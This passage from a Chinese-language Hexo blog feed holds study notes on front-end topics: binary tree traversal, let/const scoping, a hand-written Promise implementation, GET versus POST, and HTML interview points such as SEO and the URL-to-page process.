class="hljs code-wrapper"><pre><code class="hljs awk">var breadthList = []; <span class="hljs-regexp">//</span>定义保存广度遍历结果的数组var breadthTraversal = <span class="hljs-keyword">function</span>(node) &#123;    <span class="hljs-keyword">if</span> (node) &#123; <span class="hljs-regexp">//</span>判断二叉树是否为空        var que = [node]; <span class="hljs-regexp">//</span>将二叉树放入队列        <span class="hljs-keyword">while</span> (que.length !== <span class="hljs-number">0</span>) &#123; <span class="hljs-regexp">//</span>判断队列是否为空            node = que.shift(); <span class="hljs-regexp">//</span>从队列中取出一个结点            breadthList.push(node.value); <span class="hljs-regexp">//</span>将取出结点的值保存到数组            <span class="hljs-keyword">if</span> (node.left) que.push(node.left); <span class="hljs-regexp">//</span>如果存在左子树，将左子树放入队列            <span class="hljs-keyword">if</span> (node.right) que.push(node.right); <span class="hljs-regexp">//</span>如果存在右子树，将右子树放入队列        &#125;    &#125;&#125;breadthTraversal(tree);console.log(breadthList);<span class="hljs-regexp">//</span>[ <span class="hljs-string">&#x27;-&#x27;</span>, <span class="hljs-string">&#x27;+&#x27;</span>, <span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-string">&#x27;*&#x27;</span>, <span class="hljs-string">&#x27;d&#x27;</span>, <span class="hljs-string">&#x27;e&#x27;</span>, <span class="hljs-string">&#x27;b&#x27;</span>, <span class="hljs-string">&#x27;c&#x27;</span> ]</code></pre></div><h3 id="常见思路"><a href="#常见思路" class="headerlink" title="常见思路"></a>常见思路</h3><blockquote><p>第一步：先考虑用递归的方式解决问题，注意递归的终止条件。有的递归需要用到回溯法和全局变量</p><p>第二步：如果递归无法解决问题，考虑迭代法，具体的迭代方式参考层序遍历和非递归遍历</p></blockquote><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ul><li>涉及到二叉树的构造，无论普通二叉树还是二叉搜索树一定前序，都是先构造中节点。</li><li>求普通二叉树的属性，一般是后序，一般要通过递归函数的返回值做计算。</li><li>求二叉搜索树的属性，一定是中序了，要不白瞎了有序性了。</li></ul><p>注意在普通二叉树的属性中，用的是一般为后序，例如单纯求深度就用前序，二叉树找所有路径也用了前序，这是为了方便让父节点指向子节点。</p>]]></content>
    
    
    <categories>
      
      <category>算法</category>
      
    </categories>
    
    
    <tags>
      
      <tag>算法</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>let和const🍺</title>
    <link href="/hexo_blog/2021/07/17/let%E5%92%8Cconst%E5%91%BD%E4%BB%A4/"/>
    <url>/hexo_blog/2021/07/17/let%E5%92%8Cconst%E5%91%BD%E4%BB%A4/</url>
    
    <content type="html"><![CDATA[<h1 id="let和const"><a href="#let和const" class="headerlink" title="let和const"></a>let和const</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>变量声明</p><h3 id="let-命令"><a href="#let-命令" class="headerlink" title="let 命令"></a>let 命令</h3><blockquote><p>用法类似var，但是let只在<code>let</code>命令所在的代码块内有效</p></blockquote><div class="hljs code-wrapper"><pre><code class="hljs js">&#123;  <span class="hljs-keyword">let</span> a = <span class="hljs-number">10</span>;  <span class="hljs-keyword">var</span> b = <span class="hljs-number">1</span>;&#125;a <span class="hljs-comment">// ReferenceError: a is not defined.</span>b <span class="hljs-comment">// 1</span></code></pre></div><blockquote><p>可用于for内部变量循环，var变量在预编译的时候会发生变量提升，而块级作用域的let只在循环内部有效</p><p><code>每一次循环的</code>i<code>其实都是一个新的变量，所以最后输出的是</code>6<code>。你可能会问，如果每一轮循环的变量</code>i<code>都是重新声明的，那它怎么知道上一轮循环的值，从而计算出本轮循环的值？这是因为 JavaScript 引擎内部会记住上一轮循环的值，初始化本轮的变量</code>i<code>时，就在上一轮循环的基础上进行计算。</code></p></blockquote><div class="hljs code-wrapper"><pre><code class="hljs js"><span class="hljs-keyword">var</span> a = [];<span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; i++) &#123;  a[i] = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;    <span class="hljs-built_in">console</span>.log(i);  &#125;;&#125;a[<span class="hljs-number">6</span>](); <span class="hljs-comment">// 6</span></code></pre></div><blockquote><p><code>for</code>循环还有一个特别之处，就是设置循环变量的那部分是一个父作用域，而循环体内部是一个单独的子作用域。</p><p><code>函数内部的变量</code>i<code>与循环变量</code>i<code>不在同一个作用域，有各自单独的作用域（同一个作用域不可使用 </code>let<code> 重复声明同一个变量）。</code></p></blockquote><div class="hljs code-wrapper"><pre><code class="hljs js"><span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">3</span>; i++) &#123;  <span class="hljs-keyword">let</span> i = <span class="hljs-string">&#x27;abc&#x27;</span>;  <span class="hljs-built_in">console</span>.log(i);&#125;<span class="hljs-comment">// abc</span><span class="hljs-comment">// abc</span><span class="hljs-comment">// abc</span></code></pre></div><blockquote><p>​    暂时性死区</p><p>​    ES6 明确规定，如果区块中存在<code>let</code>和<code>const</code>命令，这个区块对这些命令声明的变量，从一开始就形成了封闭作用域。凡是在声明之前就使用这些变量，就会报错。</p><p>下面代码中，在<code>let</code>命令声明变量<code>tmp</code>之前，都属于变量<code>tmp</code>的“死区”。</p></blockquote><div class="hljs code-wrapper"><pre><code class="hljs js"><span class="hljs-keyword">if</span> (<span class="hljs-literal">true</span>) &#123;  <span class="hljs-comment">// TDZ开始</span>  tmp = <span class="hljs-string">&#x27;abc&#x27;</span>; <span class="hljs-comment">// ReferenceError</span>  <span class="hljs-built_in">console</span>.log(tmp); <span class="hljs-comment">// ReferenceError</span>  <span class="hljs-keyword">let</span> tmp; <span class="hljs-comment">// TDZ结束</span>  <span class="hljs-built_in">console</span>.log(tmp); <span class="hljs-comment">// undefined</span>  tmp = <span class="hljs-number">123</span>;  <span class="hljs-built_in">console</span>.log(tmp); <span class="hljs-comment">// 123</span>&#125;</code></pre></div><h3 id="const-命令"><a href="#const-命令" class="headerlink" title="const 命令"></a>const 命令</h3><blockquote><p>​    <code>const</code>声明一个只读的常量。一旦声明，常量的值就不能改变。</p><p><code>const实际上保证的，并不是变量的值不得改动，而是变量指向的那个内存地址所保存的数据不得改动。对于简单类型的数据（数值、字符串、布尔值），值就保存在变量指向的那个内存地址，因此等同于常量。但对于复合类型的数据（主要是对象和数组），变量指向的内存地址，保存的只是一个指向实际数据的指针，const只能保证这个指针是固定的（即总是指向另一个固定的地址），至于它指向的数据结构是不是可变的，就完全不能控制了。</code></p></blockquote>]]></content>
    
    
    <categories>
      
      <category>网络</category>
      
    </categories>
    
    
    <tags>
      
      <tag>网络</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>promise笔记🤓</title>
    <link href="/hexo_blog/2021/07/12/promise/"/>
    <url>/hexo_blog/2021/07/12/promise/</url>
    
    <content type="html"><![CDATA[<h1 id="Promise笔记"><a href="#Promise笔记" class="headerlink" title="Promise笔记"></a>Promise笔记</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><code>Promise</code>本质上是一个对象,js的标准内置对象，官方对他的描述就是：Promise 对象用于表示一个异步操作的最终完成 (或失败)及其结果值。</p><blockquote><p>  面试时相关问题</p></blockquote><div class="hljs code-wrapper"><pre><code>1、了解 Promise 吗？2、Promise 解决的痛点是什么？3、Promise 解决的痛点还有其他方法可以解决吗？如果有，请列举。4、Promise 如何使用？5、Promise 常用的方法有哪些？它们的作用是什么？6、Promise 在事件循环中的执行过程是怎样的？7、Promise 的业界实现都有哪些？8、能不能手写一个 Promise 的 polyfill。</code></pre></div><blockquote><p>用来解决的问题</p></blockquote><p>众所周知，<code>promise</code>解决了js的回调地狱问题(层层调用，嵌套无底洞)…..</p><h2 id="实现promise"><a href="#实现promise" class="headerlink" title="实现promise"></a>实现promise</h2><div class="hljs code-wrapper"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> PENDING = <span class="hljs-string">&quot;pending&quot;</span>;<span class="hljs-keyword">const</span> RESOLVED = <span class="hljs-string">&quot;resolved&quot;</span>;<span class="hljs-keyword">const</span> REJECTED = <span class="hljs-string">&quot;rejected&quot;</span>;<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">MyPromise</span>(<span class="hljs-params">fn</span>) </span>&#123;  <span class="hljs-comment">// 保存初始化状态</span>  <span class="hljs-keyword">var</span> self = <span class="hljs-built_in">this</span>;  <span class="hljs-comment">// 初始化状态</span>  <span class="hljs-built_in">this</span>.state = PENDING;  <span class="hljs-comment">// 用于保存 resolve 或者 rejected 传入的值</span>  <span class="hljs-built_in">this</span>.value = <span class="hljs-literal">null</span>;  <span class="hljs-comment">// 用于保存 resolve 的回调函数</span>  <span class="hljs-built_in">this</span>.resolvedCallbacks = [];  <span class="hljs-comment">// 用于保存 reject 的回调函数</span>  <span class="hljs-built_in">this</span>.rejectedCallbacks = [];  <span class="hljs-comment">// 状态转变为 resolved 方法</span>  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">resolve</span>(<span class="hljs-params">value</span>) </span>&#123;    <span class="hljs-comment">// 判断传入元素是否为 Promise 值，如果是，则状态改变必须等待前一个状态改变后再进行改变</span>    <span class="hljs-keyword">if</span> (value <span class="hljs-keyword">instanceof</span> MyPromise) &#123;      <span class="hljs-keyword">return</span> value.then(resolve, reject);    &#125;    <span class="hljs-comment">// 保证代码的执行顺序为本轮事件循环的末尾</span>    <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> &#123;      <span class="hljs-comment">// 只有状态为 pending 时才能转变，</span>      <span class="hljs-keyword">if</span> (self.state === PENDING) &#123;        <span class="hljs-comment">// 修改状态</span>        self.state = RESOLVED;        <span class="hljs-comment">// 设置传入的值</span>        self.value = value;        <span class="hljs-comment">// 执行回调函数</span>        self.resolvedCallbacks.forEach(<span class="hljs-function"><span class="hljs-params">callback</span> =&gt;</span> &#123;          callback(value);        &#125;);      &#125;    &#125;, <span class="hljs-number">0</span>);  &#125;  <span class="hljs-comment">// 状态转变为 rejected 方法</span>  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">reject</span>(<span class="hljs-params">value</span>) </span>&#123;    <span class="hljs-comment">// 保证代码的执行顺序为本轮事件循环的末尾</span>    <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> &#123;      <span class="hljs-comment">// 只有状态为 pending 时才能转变</span>      <span class="hljs-keyword">if</span> (self.state === PENDING) &#123;        <span class="hljs-comment">// 修改状态</span>        self.state = REJECTED;        <span class="hljs-comment">// 设置传入的值</span>        self.value = value;        <span class="hljs-comment">// 执行回调函数</span>        self.rejectedCallbacks.forEach(<span class="hljs-function"><span class="hljs-params">callback</span> =&gt;</span> &#123;          callback(value);        &#125;);      &#125;    &#125;, <span class="hljs-number">0</span>);  &#125;  <span class="hljs-comment">// 将两个方法传入函数执行</span>  <span class="hljs-keyword">try</span> &#123;    fn(resolve, reject);  &#125; <span class="hljs-keyword">catch</span> (e) &#123;    <span class="hljs-comment">// 遇到错误时，捕获错误，执行 reject 函数</span>    reject(e);  &#125;&#125;MyPromise.prototype.then = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">onResolved, onRejected</span>) </span>&#123;  <span class="hljs-comment">// 首先判断两个参数是否为函数类型，因为这两个参数是可选参数</span>  onResolved =    <span class="hljs-keyword">typeof</span> onResolved === <span class="hljs-string">&quot;function&quot;</span>      ? onResolved      : <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">value</span>) </span>&#123;          <span class="hljs-keyword">return</span> value;        &#125;;  onRejected =    <span class="hljs-keyword">typeof</span> onRejected === <span class="hljs-string">&quot;function&quot;</span>      ? onRejected      : <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">error</span>) </span>&#123;          <span class="hljs-keyword">throw</span> error;        &#125;;  <span class="hljs-comment">// 如果是等待状态，则将函数加入对应列表中</span>  <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.state === PENDING) &#123;    <span class="hljs-built_in">this</span>.resolvedCallbacks.push(onResolved);    <span class="hljs-built_in">this</span>.rejectedCallbacks.push(onRejected);  &#125;  <span class="hljs-comment">// 如果状态已经凝固，则直接执行对应状态的函数</span>  <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.state === RESOLVED) &#123;    onResolved(<span class="hljs-built_in">this</span>.value);  &#125;  <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.state === REJECTED) &#123;    onRejected(<span class="hljs-built_in">this</span>.value);  &#125;&#125;;</code></pre></div>]]></content>
    
    
    <categories>
      
      <category>js</category>
      
    </categories>
    
    
    <tags>
      
      <tag>js</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>get和post请求🍺</title>
    <link href="/hexo_blog/2021/02/12/get%E5%92%8Cpost/"/>
    <url>/hexo_blog/2021/02/12/get%E5%92%8Cpost/</url>
    
    <content type="html"><![CDATA[<h1 id="get和post请求"><a href="#get和post请求" class="headerlink" title="get和post请求"></a>get和post请求</h1><h3 id="get-和-post"><a href="#get-和-post" class="headerlink" title="get 和 post"></a>get 和 post</h3><blockquote><ul><li>GET在浏览器回退时是无害的，而POST会再次提交请求。</li><li>GET产生的URL地址可以被Bookmark，而POST不可以。</li><li>GET请求会被浏览器主动cache，而POST不会，除非手动设置。</li><li>GET请求只能进行url编码，而POST支持多种编码方式。</li><li>GET请求参数会被完整保留在浏览器历史记录里，而POST中的参数不会被保留。</li><li>GET请求在URL中传送的参数是有长度限制的，而POST么有。</li><li>对参数的数据类型，GET只接受ASCII字符，而POST没有限制。</li><li>GET比POST更不安全，因为参数直接暴露在URL上，所以不能用来传递敏感信息。</li><li>GET参数通过URL传递，POST放在Request body中。</li></ul></blockquote><h3 id="HTTP是什么-HTTP是基于TCP-IP的关于数据如何在万维网中如何通信的协议。"><a href="#HTTP是什么-HTTP是基于TCP-IP的关于数据如何在万维网中如何通信的协议。" class="headerlink" title="HTTP是什么?HTTP是基于TCP/IP的关于数据如何在万维网中如何通信的协议。"></a>HTTP是什么?HTTP是基于TCP/IP的关于数据如何在万维网中如何通信的协议。</h3><blockquote><p>HTTP的底层是TCP/IP。所以GET和POST的底层也是TCP/IP，也就是说，GET/POST都是TCP链接。GET和POST能做的事情是一样一样的。你要给GET加上request body，给POST带上url参数，技术上是完全行的通的。</p><p>​        在万维网世界中，TCP就像汽车，我们用TCP来运输数据，它很可靠，从来不会发生丢件少件的现象。但是如果路上跑的全是看起来一模一样的汽车，那这个世界看起来是一团混乱，送急件的汽车可能被前面满载货物的汽车拦堵在路上，整个交通系统一定会瘫痪。为了避免这种情况发生，交通规则HTTP诞生了。HTTP给汽车运输设定了好几个服务类别，有GET, POST, PUT, DELETE等等，HTTP规定，当执行GET请求的时候，要给汽车贴上GET的标签(设置method为GET)，而且要求把传送的数据放在车顶上(url中)以方便记录。如果是POST请求，就要在车上贴上POST的标签，并把货物放在车厢里。当然，你也可以在GET的时候往车厢内偷偷藏点货物，但是这是很不光彩;也可以在POST的时候在车顶上也放一些数据，让人觉得傻乎乎的。HTTP只是个行为准则，而TCP才是GET和POST怎么实现的基本。但是，我们只看到HTTP对GET和POST参数的传送渠道(url还是requrest body)提出了要求。“标准答案”里关于参数大小的限制又是从哪来的呢?</p><p>​        在我大万维网世界中，还有另一个重要的角色：运输公司。不同的浏览器(发起http请求)和服务器(接受http请求)就是不同的运输公司。 虽然理论上，你可以在车顶上无限的堆货物(url中无限加参数)。但是运输公司可不傻，装货和卸货也是有很大成本的，他们会限制单次运输量来控制风险，数据量太大对浏览器和服务器都是很大负担。业界不成文的规定是，(大多数)浏览器通常都会限制url长度在2K个字节，而(大多数)服务器最多处理64K大小的url。超过的部分，恕不处理。如果你用GET服务，在request body偷偷藏了数据，不同服务器的处理方式也是不同的，有些服务器会帮你卸货，读出数据，有些服务器直接忽略，所以，虽然GET可以带request body，也不能保证一定能被接收到哦。</p></blockquote><p><code>其实，GET和POST本质上就是TCP链接，并无差别。但是由于HTTP的规定和浏览器/服务器的限制，导致他们在应用过程中体现出一些不同。</code></p><blockquote><p>GET和POST还有一个重大区别，</p><p>简单的说：</p><p>GET产生一个TCP数据包;POST产生两个TCP数据包。</p><p>长的说：</p><p>对于GET方式的请求，浏览器会把http header和data一并发送出去，服务器响应200(返回数据);</p><p>而对于POST，浏览器先发送header，服务器响应100 continue，浏览器再发送data，服务器响应200 ok(返回数据)。</p><p>也就是说，GET只需要汽车跑一趟就把货送到了，而POST得跑两趟，第一趟，先去和服务器打个招呼“嗨，我等下要送一批货来，你们打开门迎接我”，然后再回头把货送过去。</p><p>因为POST需要两步，时间上消耗的要多一点，看起来GET比POST更有效。因此Yahoo团队有推荐用GET替换POST来优化网站性能。但这是一个坑!跳入需谨慎。为什么?</p><ol><li><p>GET与POST都有自己的语义，不能随便混用。</p></li><li><p>据研究，在网络环境好的情况下，发一次包的时间和发两次包的时间差别基本可以无视。而在网络环境差的情况下，两次包的TCP在验证数据包完整性上，有非常大的优点。</p></li><li><p>并不是所有浏览器都会在POST中发送两次包，Firefox就只发送一次。</p></li></ol></blockquote>]]></content>
    
    
    <categories>
      
      <category>网络</category>
      
    </categories>
    
    
    <tags>
      
      <tag>网络</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>html知识点总结👮‍♀️</title>
    <link href="/hexo_blog/2020/11/02/HTML/"/>
    <url>/hexo_blog/2020/11/02/HTML/</url>
    
    <content type="html"><![CDATA[<h3 id="html知识点总结✌️✌️"><a href="#html知识点总结✌️✌️" class="headerlink" title="html知识点总结✌️✌️"></a>html知识点总结✌️✌️</h3><h3 id="1-前端需要注意哪些SEO"><a href="#1-前端需要注意哪些SEO" class="headerlink" title="#1 前端需要注意哪些SEO"></a><a href="http://interview.poetries.top/docs/base.html#_1-%E5%89%8D%E7%AB%AF%E9%9C%80%E8%A6%81%E6%B3%A8%E6%84%8F%E5%93%AA%E4%BA%9Bseo">#</a>1 前端需要注意哪些SEO</h3><ul><li>合理的<code>title</code>、<code>description</code>、<code>keywords</code>：搜索对着三项的权重逐个减小，<code>title</code>值强调重点即可，重要关键词出现不要超过2次，而且要靠前，不同页面<code>title</code>要有所不同；<code>description</code>把页面内容高度概括，长度合适，不可过分堆砌关键词，不同页面<code>description</code>有所不同；<code>keywords</code>列举出重要关键词即可</li><li>语义化的<code>HTML</code>代码，符合W3C规范：语义化代码让搜索引擎容易理解网页</li><li>重要内容<code>HTML</code>代码放在最前：搜索引擎抓取<code>HTML</code>顺序是从上到下，有的搜索引擎对抓取长度有限制，保证重要内容一定会被抓取</li><li>重要内容不要用<code>js</code>输出：爬虫不会执行js获取内容</li><li>少用<code>iframe</code>：搜索引擎不会抓取<code>iframe</code>中的内容</li><li>非装饰性图片必须加<code>alt</code></li><li>提高网站速度：网站速度是搜索引擎排序的一个重要指标</li></ul><h3 id="2-lt-img-gt-的title和alt有什么区别"><a href="#2-lt-img-gt-的title和alt有什么区别" class="headerlink" title="#2 &lt;img&gt;的title和alt有什么区别"></a><a href="http://interview.poetries.top/docs/base.html#_2-img-%E7%9A%84title%E5%92%8Calt%E6%9C%89%E4%BB%80%E4%B9%88%E5%8C%BA%E5%88%AB">#</a>2 <code>&lt;img&gt;</code>的<code>title</code>和<code>alt</code>有什么区别</h3><ul><li>通常当鼠标滑动到元素上的时候显示</li><li><code>alt</code>是<code>&lt;img&gt;</code>的特有属性，是图片内容的等价描述，用于图片无法加载时显示、读屏器阅读图片。可提图片高可访问性，除了纯装饰图片外都必须设置有意义的值，搜索引擎会重点分析。</li></ul><h3 id="3-HTTP的几种请求方法用途"><a href="#3-HTTP的几种请求方法用途" class="headerlink" title="#3 HTTP的几种请求方法用途"></a><a href="http://interview.poetries.top/docs/base.html#_3-http%E7%9A%84%E5%87%A0%E7%A7%8D%E8%AF%B7%E6%B1%82%E6%96%B9%E6%B3%95%E7%94%A8%E9%80%94">#</a>3 HTTP的几种请求方法用途</h3><ul><li><code>GET</code>方法<ul><li>发送一个请求来取得服务器上的某一资源</li></ul></li><li><code>POST</code>方法<ul><li>向<code>URL</code>指定的资源提交数据或附加新的数据</li></ul></li><li><code>PUT</code>方法<ul><li>跟<code>POST</code>方法很像，也是想服务器提交数据。但是，它们之间有不同。<code>PUT</code>指定了资源在服务器上的位置，而<code>POST</code>没有</li></ul></li><li><code>HEAD</code>方法<ul><li>只请求页面的首部</li></ul></li><li><code>DELETE</code>方法<ul><li>删除服务器上的某资源</li></ul></li><li><code>OPTIONS</code>方法<ul><li>它用于获取当前<code>URL</code>所支持的方法。如果请求成功，会有一个<code>Allow</code>的头包含类似<code>“GET,POST”</code>这样的信息</li></ul></li><li><code>TRACE</code>方法<ul><li><code>TRACE</code>方法被用于激发一个远程的，应用层的请求消息回路</li></ul></li><li><code>CONNECT</code>方法<ul><li>把请求连接转换到透明的<code>TCP/IP</code>通道</li></ul></li></ul><h3 id="4-从浏览器地址栏输入url到显示页面的步骤"><a href="#4-从浏览器地址栏输入url到显示页面的步骤" class="headerlink" title="#4 从浏览器地址栏输入url到显示页面的步骤"></a><a href="http://interview.poetries.top/docs/base.html#_4-%E4%BB%8E%E6%B5%8F%E8%A7%88%E5%99%A8%E5%9C%B0%E5%9D%80%E6%A0%8F%E8%BE%93%E5%85%A5url%E5%88%B0%E6%98%BE%E7%A4%BA%E9%A1%B5%E9%9D%A2%E7%9A%84%E6%AD%A5%E9%AA%A4">#</a>4 从浏览器地址栏输入url到显示页面的步骤</h3><p><strong>基础版本</strong></p><ul><li>浏览器根据请求的<code>URL</code>交给<code>DNS</code>域名解析，找到真实<code>IP</code>，向服务器发起请求；</li><li>服务器交给后台处理完成后返回数据，浏览器接收文件（<code>HTML、JS、CSS</code>、图象等）；</li><li>浏览器对加载到的资源（<code>HTML、JS、CSS</code>等）进行语法解析，建立相应的内部数据结构（如<code>HTML</code>的<code>DOM</code>）；</li><li>载入解析到的资源文件，渲染页面，完成。</li></ul><p><strong>详细版</strong></p><ol><li><p>在浏览器地址栏输入URL</p></li><li><p>浏览器查看</p><p>缓存</p><p>，如果请求资源在缓存中并且新鲜，跳转到转码步骤</p><ol><li><p>如果资源未缓存，发起新请求</p></li><li><p>如果已缓存，检验是否足够新鲜，足够新鲜直接提供给客户端，否则与服务器进行验证。</p></li><li><p>检验新鲜通常有两个HTTP头进行控制</p><div class="hljs code-wrapper"><pre><code class="hljs ebnf"><span class="hljs-attribute">Expires</span></code></pre></div><p>和</p><div class="hljs code-wrapper"><pre><code class="hljs ebnf"><span class="hljs-attribute">Cache-Control</span></code></pre></div><p>：</p><ul><li>HTTP1.0提供Expires，值为一个绝对时间表示缓存新鲜日期</li><li>HTTP1.1增加了Cache-Control: max-age=,值为以秒为单位的最大新鲜时间</li></ul></li></ol></li><li><p>浏览器<strong>解析URL</strong>获取协议，主机，端口，path</p></li><li><p>浏览器<strong>组装一个HTTP（GET）请求报文</strong></p></li><li><p>浏览器</p><p>获取主机ip地址</p><p>，过程如下：</p><ol><li>浏览器缓存</li><li>本机缓存</li><li>hosts文件</li><li>路由器缓存</li><li>ISP DNS缓存</li><li>DNS递归查询（可能存在负载均衡导致每次IP不一样）</li></ol></li><li><p>打开一个socket与目标IP地址，端口建立TCP链接</p><p>，三次握手如下：</p><ol><li>客户端发送一个TCP的<strong>SYN=1，Seq=X</strong>的包到服务器端口</li><li>服务器发回<strong>SYN=1， ACK=X+1， Seq=Y</strong>的响应包</li><li>客户端发送<strong>ACK=Y+1， Seq=Z</strong></li></ol></li><li><p>TCP链接建立后<strong>发送HTTP请求</strong></p></li><li><p>服务器接受请求并解析，将请求转发到服务程序，如虚拟主机使用HTTP Host头部判断请求的服务程序</p></li><li><p>服务器检查<strong>HTTP请求头是否包含缓存验证信息</strong>如果验证缓存新鲜，返回<strong>304</strong>等对应状态码</p></li><li><p>处理程序读取完整请求并准备HTTP响应，可能需要查询数据库等操作</p></li><li><p>服务器将<strong>响应报文通过TCP连接发送回浏览器</strong></p></li><li><p>浏览器接收HTTP响应，然后根据情况选择</p><p>关闭TCP连接或者保留重用，关闭TCP连接的四次握手如下</p><p>：</p><ol><li>主动方发送<strong>Fin=1， Ack=Z， Seq= X</strong>报文</li><li>被动方发送<strong>ACK=X+1， Seq=Z</strong>报文</li><li>被动方发送<strong>Fin=1， ACK=X， Seq=Y</strong>报文</li><li>主动方发送<strong>ACK=Y， Seq=X</strong>报文</li></ol></li><li><p>浏览器检查响应状态吗：是否为1XX，3XX， 4XX， 5XX，这些情况处理与2XX不同</p></li><li><p>如果资源可缓存，<strong>进行缓存</strong></p></li><li><p>对响应进行<strong>解码</strong>（例如gzip压缩）</p></li><li><p>根据资源类型决定如何处理（假设资源为HTML文档）</p></li><li><p><strong>解析HTML文档，构件DOM树，下载资源，构造CSSOM树，执行js脚本</strong>，这些操作没有严格的先后顺序，以下分别解释</p></li><li><p>构建DOM树</p><p>：</p><ol><li><strong>Tokenizing</strong>：根据HTML规范将字符流解析为标记</li><li><strong>Lexing</strong>：词法分析将标记转换为对象并定义属性和规则</li><li><strong>DOM construction</strong>：根据HTML标记关系将对象组成DOM树</li></ol></li><li><p>解析过程中遇到图片、样式表、js文件，<strong>启动下载</strong></p></li><li><p>构建</p><p>CSSOM树</p><p>：</p><ol><li><strong>Tokenizing</strong>：字符流转换为标记流</li><li><strong>Node</strong>：根据标记创建节点</li><li><strong>CSSOM</strong>：节点创建CSSOM树</li></ol></li><li><p><a href="https://developers.google.com/web/fundamentals/performance/critical-rendering-path/render-tree-construction">根据DOM树和CSSOM树构建渲染树 (opens new window)</a></p><p>:</p><ol><li>从DOM树的根节点遍历所有<strong>可见节点</strong>，不可见节点包括：1）<code>script</code>,<code>meta</code>这样本身不可见的标签。2)被css隐藏的节点，如<code>display: none</code></li><li>对每一个可见节点，找到恰当的CSSOM规则并应用</li><li>发布可视节点的内容和计算样式</li></ol></li><li><p>js解析如下</p><p>：</p><ol><li>浏览器创建Document对象并解析HTML，将解析到的元素和文本节点添加到文档中，此时<strong>document.readystate为loading</strong></li><li>HTML解析器遇到<strong>没有async和defer的script时</strong>，将他们添加到文档中，然后执行行内或外部脚本。这些脚本会同步执行，并且在脚本下载和执行时解析器会暂停。这样就可以用document.write()把文本插入到输入流中。<strong>同步脚本经常简单定义函数和注册事件处理程序，他们可以遍历和操作script和他们之前的文档内容</strong></li><li>当解析器遇到设置了<strong>async</strong>属性的script时，开始下载脚本并继续解析文档。脚本会在它<strong>下载完成后尽快执行</strong>，但是<strong>解析器不会停下来等它下载</strong>。异步脚本**禁止使用document.write()**，它们可以访问自己script和之前的文档元素</li><li>当文档完成解析，document.readState变成interactive</li><li>所有<strong>defer</strong>脚本会<strong>按照在文档出现的顺序执行</strong>，延迟脚本<strong>能访问完整文档树</strong>，禁止使用document.write()</li><li>浏览器<strong>在Document对象上触发DOMContentLoaded事件</strong></li><li>此时文档完全解析完成，浏览器可能还在等待如图片等内容加载，等这些<strong>内容完成载入并且所有异步脚本完成载入和执行</strong>，document.readState变为complete，window触发load事件</li></ol></li><li><p><strong>显示页面</strong>（HTML解析过程中会逐步显示页面）</p></li></ol><p><strong>详细简版</strong></p><ol><li>从浏览器接收<code>url</code>到开启网络请求线程（这一部分可以展开浏览器的机制以及进程与线程之间的关系）</li><li>开启网络线程到发出一个完整的<code>HTTP</code>请求（这一部分涉及到dns查询，<code>TCP/IP</code>请求，五层因特网协议栈等知识）</li><li>从服务器接收到请求到对应后台接收到请求（这一部分可能涉及到负载均衡，安全拦截以及后台内部的处理等等）</li><li>后台和前台的<code>HTTP</code>交互（这一部分包括<code>HTTP</code>头部、响应码、报文结构、<code>cookie</code>等知识，可以提下静态资源的<code>cookie</code>优化，以及编码解码，如<code>gzip</code>压缩等）</li><li>单独拎出来的缓存问题，<code>HTTP</code>的缓存（这部分包括http缓存头部，<code>ETag</code>，<code>catch-control</code>等）</li><li>浏览器接收到<code>HTTP</code>数据包后的解析流程（解析<code>html</code>-词法分析然后解析成<code>dom</code>树、解析<code>css</code>生成<code>css</code>规则树、合并成<code>render</code>树，然后<code>layout</code>、<code>painting</code>渲染、复合图层的合成、<code>GPU</code>绘制、外链资源的处理、<code>loaded</code>和<code>DOMContentLoaded</code>等）</li><li><code>CSS</code>的可视化格式模型（元素的渲染规则，如包含块，控制框，<code>BFC</code>，<code>IFC</code>等概念）</li><li><code>JS</code>引擎解析过程（<code>JS</code>的解释阶段，预处理阶段，执行阶段生成执行上下文，<code>VO</code>，作用域链、回收机制等等）</li><li>其它（可以拓展不同的知识模块，如跨域，web安全，<code>hybrid</code>模式等等内容）</li></ol><h3 id="5-如何进行网站性能优化"><a href="#5-如何进行网站性能优化" class="headerlink" title="#5 如何进行网站性能优化"></a><a href="http://interview.poetries.top/docs/base.html#_5-%E5%A6%82%E4%BD%95%E8%BF%9B%E8%A1%8C%E7%BD%91%E7%AB%99%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96">#</a>5 如何进行网站性能优化</h3><ul><li><code>content</code>方面<ul><li>减少<code>HTTP</code>请求：合并文件、<code>CSS</code>精灵、<code>inline 